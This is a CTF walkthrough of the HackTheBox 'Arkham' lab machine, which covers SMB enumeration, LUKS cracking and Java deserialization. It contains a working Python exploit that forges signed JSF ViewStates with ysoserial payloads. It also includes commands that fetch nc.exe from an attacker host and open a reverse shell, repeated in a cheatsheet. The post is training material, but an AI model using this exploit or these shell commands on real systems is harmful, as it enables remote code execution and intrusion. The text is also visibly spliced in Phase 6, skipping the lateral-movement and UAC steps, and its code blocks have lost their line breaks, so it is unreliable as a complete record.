Others force you to connect the dots across multiple domains networking, cryptography, web exploitation, and Windows internals. Arkham is one of those boxes.</p><p>Starting from nothing more than an anonymous SMB share, we will crack a LUKS-encrypted backup, forge a malicious JSF ViewState to gain remote code execution, pivot from Alfred to Batman, and finally bypass UAC using an SMB UNC path trick. It is a beautifully themed Batman-inspired box, and every breadcrumb matters.</p><p>If you are preparing for the OSCP, OSWE, or just want to understand how small misconfigurations cascade into full compromise, this walkthrough is for you.</p><h2 id="machine-overview">Machine Overview</h2><p>Name: Arkham<br />OS: Windows Server 2019<br />Difficulty: Medium<br />IP: 10.129.228.116</p><h2 id="attack-chain-at-a-glance">Attack Chain at a Glance:</h2><p>Anonymous SMB -&gt; LUKS-encrypted disk image -&gt; crack password (batmanforever) -&gt; extract JSF HMAC/encryption key (JsF9876-) -&gt; forge malicious ViewState -&gt; Java deserialization RCE -&gt; shell as Alfred -&gt; backup.zip -&gt; OST email -&gt; Batman’s password -&gt; WinRM lateral move -&gt; mount C$ over SMB -&gt; read root.txt</p><h2 id="the-mindset-before-the-shell">The Mindset Before the Shell</h2><p>Before firing off tools, it is worth reminding yourself of a few principles that make the difference between a fast root and hours of spinning:</p><p>1. Follow the data, not the script. Every step should answer a question. Each finding is a breadcrumb, not a destination.<br />2. Theme awareness matters. BatShare, Alfred, Bruce, batmanforever — these hints are deliberate. Theme-based wordlists and educated guesses save time.<br />3. Understand the exploit. This box teaches LUKS, JSF serialization, HMAC signing, and Windows UAC. Knowing why something works lets you adapt when it breaks.<br />4. Privilege is layered. Anonymous -&gt; low user -&gt; mid user -&gt; admin. Focus on the current link in the chain.</p><h2 id="phase-1-reconnaissance-mapping-the-surface">Phase 1: Reconnaissance — Mapping the Surface</h2><p>Every engagement starts with the same question: what can I reach?</p><p>nmap -sC -sV -p- 10.129.228.116</p><p>This gives us a fast, complete picture of open services:</p><p>PORT STATE SERVICE VERSION<br />80/tcp open http Microsoft IIS 10.0<br />135/tcp open msrpc<br />139/tcp open netbios-ssn<br />445/tcp open microsoft-ds<br />8080/tcp open http Apache Tomcat 8.5.37<br />49666/tcp open msrpc<br />49667/tcp open msrpc</p><p>What stands out?</p><p>- Port 80 is Default IIS. Probably not the initial vector.<br />- Port 8080 is Apache Tomcat 8.5.37. Java app servers love deserialization issues.<br />- Ports 139/445 are SMB. Anonymous access is a common quick win.<br />- RPC ports confirm it is Windows; less immediately useful.</p><p>Decision: check SMB first, then dig into Tomcat.</p><figure><img src="/writing/media/b85896e8de22948ce6b05634.webp" alt="HackTheBox “Arkham” Walkthrough, figure 2" width="1200" height="931" loading="lazy" decoding="async" /></figure><h2 id="phase-2-smb-enumeration-the-door-swings-open">Phase 2: SMB Enumeration — The Door Swings Open</h2><p>SMB null sessions are still one of the most reliable low-hanging fruits in CTFs and real environments.</p><p>smbclient -N -L //10.129.228.116</p><p>Output:</p><p>Sharename Type Comment<br /> — — — — — — — — — — -<br />ADMIN$ Disk Remote Admin<br />BatShare Disk Master Wayne’s secrets<br />C$ Disk Default share<br />IPC$ IPC Remote IPC<br />Users Disk</p><p>A custom share named BatShare with the comment “Master Wayne’s secrets”? That is where we go next.</p><p>smbclient -N //10.129.228.116/BatShare</p><p>Inside, we find a single archive:</p><p>smb: \&gt; ls<br /> appserver.zip A 4046695</p><p>smb: \&gt; get appserver.zip</p><p>Extracting it reveals two files: IMPORTANT.txt (a note from Bruce to Alfred about a Linux backup) and backup.img.</p><p>file backup.img<br /># backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256]</p><figure><img src="/writing/media/2332d58bfa64c86a198a2940.webp" alt="HackTheBox “Arkham” Walkthrough, figure 3" width="1200" height="427" loading="lazy" decoding="async" /></figure><h2 id="phase-3-cracking-the-luks-image">Phase 3: Cracking the LUKS Image</h2><p>LUKS is designed to be slow. Brute-forcing the entire rockyou.txt list at roughly 16 attempts per second would take days. We need a smarter approach.</p><p>This is where theme awareness pays off. The share is BatShare. The note mentions Bruce and Alfred. The comment says “Master Wayne.” A Batman-themed wordlist is the obvious move.</p><p>grep -i batman /usr/share/wordlists/rockyou.txt &gt; batman.txt<br />wc -l batman.txt<br /># ~900 passwords</p><p>Then crack with bruteforce-luks:</p><p>bruteforce-luks -t 4 -f batman.txt -v 10 backup.img</p><p>Password found: batmanforever</p><p>With the passphrase, we open the image:</p><p>sudo cryptsetup luksOpen backup.img arkham_backup<br />sudo mount /dev/mapper/arkham_backup /mnt<br />ls /mnt/Mask/</p><p>Inside we find the real treasure: tomcat-stuff/, including a web.xml.bak file.</p><figure><img src="/writing/media/77e3f158bef39bca9ff3a100.webp" alt="HackTheBox “Arkham” Walkthrough, figure 4" width="1196" height="1054" loading="lazy" decoding="async" /></figure><p>cat /mnt/Mask/tomcat-stuff/web.xml.bak</p><p>Key contents:</p><p>&lt;param-name&gt;org.apache.myfaces.SECRET&lt;/param-name&gt;<br />&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;</p><p>&lt;param-name&gt;org.apache.myfaces.MAC_ALGORITHM&lt;/param-name&gt;<br />&lt;param-value&gt;HmacSHA1&lt;/param-value&gt;</p><p>&lt;param-name&gt;org.apache.myfaces.MAC_SECRET&lt;/param-name&gt;<br />&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;</p><figure><img src="/writing/media/040e82d558398992bc33813c.webp" alt="HackTheBox “Arkham” Walkthrough, figure 5" width="1200" height="1053" loading="lazy" decoding="async" /></figure><p>Decode the secret:</p><p>echo “SnNGOTg3Ni0=” | base64 -d<br /># JsF9876-</p><p>This is the server’s JSF ViewState signing and encryption key. With it, we can forge arbitrary ViewStates.</p><figure><img src="/writing/media/55bc960001b14e4db9954343.webp" alt="HackTheBox “Arkham” Walkthrough, figure 6" width="598" height="120" loading="lazy" decoding="async" /></figure><h2 id="phase-4-jsf-viewstate-deserialization-rce">Phase 4: JSF ViewState Deserialization RCE</h2><p>What is JSF ViewState?</p><p>JavaServer Faces (JSF) stores page state in a serialized base64 blob called the ViewState. When the user submits a form, the server deserializes that blob to reconstruct the page.</p><p>Java deserialization of untrusted data is a well-known path to Remote Code Execution. Normally, the ViewState is protected by encryption and HMAC signing — so clients cannot tamper with it. But we just extracted the key.</p><p>The ViewState Crypto Structure</p><p>base64( DES_ECB_encrypt(payload) + HMAC_SHA1(encrypted_payload) )</p><p>- Encryption: DES-ECB with key JsF9876-<br />- MAC: HmacSHA1 with key JsF9876-<br />- MAC appended as the last 20 bytes</p><p>Building the Exploit</p><p>We use ysoserial to generate a malicious serialized Java object. The gadget chain CommonsCollections5 works with Apache Commons Collections 3.x, which Tomcat 8.5.37 ships with.</p><p>Environment setup:</p><pre><code data-language="text">wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar \ -O /opt/ysoserial.jarpip install pycryptodome - break-system-packagesysoserial needs Java 8-11. On this ARM64 Kali machine, use Java 11 explicitly:/usr/lib/jvm/java-11-openjdk-arm64/bin/java -version</code></pre><p>Here is the exploit script that forges and submits the malicious ViewState:</p><pre><code data-language="text">#!/usr/bin/env python3import requestsimport subprocessimport sysfrom base64 import b64encodefrom Crypto.Cipher import DESfrom Crypto.Hash import SHA, HMACfrom os import devnullJAVA = '/usr/lib/jvm/java-11-openjdk-arm64/bin/java'YSOSERIAL = '/opt/ysoserial.jar'TARGET = 'http://10.129.228.116:8080/userSubscribe.faces'KEY = b'JsF9876-'cmd = sys.argv[1]with open(devnull, 'w') as null: payload = subprocess.check_output( [JAVA, '-jar', YSOSERIAL, 'CommonsCollections5', cmd], stderr=null )pad = (8 - (len(payload) % 8)) % 8padded = payload + (chr(pad) * pad).encode()d = DES.new(KEY, DES.MODE_ECB)enc_payload = d.encrypt(padded)sig = HMAC.new(KEY, enc_payload, SHA).digest()viewstate = b64encode(enc_payload + sig)sess = requests.session()sess.get(TARGET)sess.post(TARGET, data={ 'j_id_jsp_1623871077_1%3Aemail': 'd', 'j_id_jsp_1623871077_1%3Asubmit': 'SIGN+UP', 'j_id_jsp_1623871077_1_SUBMIT': '1', 'javax.faces.ViewState': viewstate})print("[+] Payload sent")</code></pre><p>Pro Tip: Ping Before Shell</p><p>Before throwing a reverse shell, verify execution with something observable:</p><p>Terminal 1:<br />sudo tcpdump -i tun0 icmp</p><p>Terminal 2:<br />python3 exploit.py “ping -n 2 10.10.16.84”</p><p>A successful ping confirms the deserialization chain works, outbound traffic reaches you, and the only remaining variable is the shell itself.</p><figure><img src="/writing/media/367a09d82f66034eceeaf457.webp" alt="HackTheBox “Arkham” Walkthrough, figure 7" width="762" height="164" loading="lazy" decoding="async" /></figure><figure><img src="/writing/media/bb9a09930cdefb6a5389b2e1.webp" alt="HackTheBox “Arkham” Walkthrough, figure 8" width="1200" height="259" loading="lazy" decoding="async" /></figure><h2 id="phase-5-shell-as-alfred-and-the-user-flag">Phase 5: Shell as Alfred and the User Flag</h2><p>With RCE confirmed, we drop a Windows netcat binary. Because AppLocker is enabled, we use a known safe path: C:\Windows\System32\spool\drivers\color\.</p><p>Serve the binary:<br />python3 -m http.server 80</p><figure><img src="/writing/media/69913e20d62bfe3038a321a1.webp" alt="HackTheBox “Arkham” Walkthrough, figure 9" width="1044" height="324" loading="lazy" decoding="async" /></figure><p>Upload it:<br />python3 exploit.py “powershell -c Invoke-WebRequest -Uri <a href="http://10.10.14.6/nc.exe" rel="nofollow noopener noreferrer" target="_blank">http://10.10.14.6/nc.exe</a> -OutFile C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe”</p><figure><img src="/writing/media/c669a63be58a8b58c9150951.webp" alt="HackTheBox “Arkham” Walkthrough, figure 10" width="1200" height="87" loading="lazy" decoding="async" /></figure><p>Start a listener:<br />rlwrap nc -lnvp 4444</p><p>Trigger the shell:<br />python3 exploit.py “C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -e cmd.exe 10.10.14.6 4444”</p><figure><img src="/writing/media/cedc10d968ecb4fa027c9ef9.webp" alt="HackTheBox “Arkham” Walkthrough, figure 11" width="1200" height="124" loading="lazy" decoding="async" /></figure><p>We catch the shell:</p><p>connect to [10.10.14.6] from (UNKNOWN) [10.129.228.116] 49685<br />Microsoft Windows [Version 10.0.17763.107]</p><p>C:\tomcat\apache-tomcat-8.5.37\bin&gt; whoami<br />arkham\alfred</p><figure><img src="/writing/media/efbc819a8d9945f6a2e64850.webp" alt="HackTheBox “Arkham” Walkthrough, figure 12" width="1070" height="932" loading="lazy" decoding="async" /></figure><p>User flag:</p><p>C:\&gt; type C:\Users\Alfred\Desktop\user.txt</p><figure><img src="/writing/media/91fc1a9b4a279e6ad81fdfe6.webp" alt="HackTheBox “Arkham” Walkthrough, figure 13" width="1118" height="150" loading="lazy" decoding="async" /></figure><h2 id="phase-6-lateral-movement-to-batman">Phase 6: Lateral Movement to Batman</h2><p>Landing as Alfred is only halfway there. The next step is classic post-exploitation enumeration.</p><p>C:\&gt; net users<br />Administrator Alfred Batman DefaultAccount Guest WDAGUtilityAccount</p><p>C:\&gt; net user batman<br />Local Group Memberships: *Administrators *Remote Management Use *Users</p><p>Batman is in the Administrators group and Remote Management Users. If we can get his password, we can WinRM in as a local admin.</p><figure><img src="/writing/media/1220cf90641ebf4a67a883b7.webp" alt="HackTheBox “Arkham” Walkthrough, figure 14" width="1178" Windows UAC filters admin tokens by default.</p><p>C:\&gt; type C:\Users\Administrator\Desktop\root.txt</p><figure><img src="/writing/media/55f76c08c6acd3277994e045.webp" alt="HackTheBox “Arkham” Walkthrough, figure 22" width="1200" height="755" loading="lazy" decoding="async" /></figure><p>Key Takeaways</p><p>1. Anonymous SMB access is still a critical foothold. One misconfigured share handed us a full server backup.<br />2. Backups are dangerous. The LUKS image contained Tomcat’s secret key because backups are rarely protected like production systems.<br />3. Java deserialization is powerful but protocol-sensitive. ysoserial gave us the payload, but understanding the DES + HMAC wrapper was essential to delivering it.<br />4. Credentials live everywhere. Alfred’s Outlook backup, stored in a zip in Downloads, contained Batman’s password.<br />5. UAC is not a security boundary. A simple UNC path bypassed it entirely.</p><h2 id="commands-cheatsheet">Commands Cheatsheet</h2><p>SMB enumeration:<br />smbclient -N -L //10.129.228.116<br />smbclient -N //10.129.228.116/BatShare</p><p>LUKS cracking:<br />grep -i batman /usr/share/wordlists/rockyou.txt &gt; batman.txt<br />bruteforce-luks -t 4 -f batman.txt -v 10 backup.img<br />sudo cryptsetup luksOpen backup.img arkham_backup # pw: batmanforever<br />sudo mount /dev/mapper/arkham_backup /mnt</p><p>Extract JSF key:<br />grep -A1 “SECRET\|MAC_SECRET” /mnt/Mask/tomcat-stuff/web.xml.bak<br />echo “SnNGOTg3Ni0=” | base64 -d # =&gt; JsF9876-</p><p>RCE verification:<br />sudo tcpdump -i tun0 icmp<br />python3 exploit.py “ping -n 2 &lt;KALI_IP&gt;”</p><p>Shell delivery:<br />python3 -m http.server 80<br />rlwrap nc -lnvp 443<br />python3 exploit.py “powershell -c Invoke-WebRequest -Uri http://&lt;KALI_IP&gt;/nc.exe -OutFile C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe”<br />python3 exploit.py “C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -e cmd.exe &lt;KALI_IP&gt; 443”</p><p>Lateral move:<br />impacket-smbserver -smb2support -username kali -password kali share .<br />readpst -S alfred@arkham.local.ost</p><p>Root:<br />net use Z: \\ARKHAM\C$<br />type Z:\Users\Administrator\Desktop\root.txt</p><h2 id="final-thoughts">Final Thoughts</h2><p>Arkham is a fantastic example of how a single oversight an anonymous SMB share with a backup inside can unravel an entire machine.
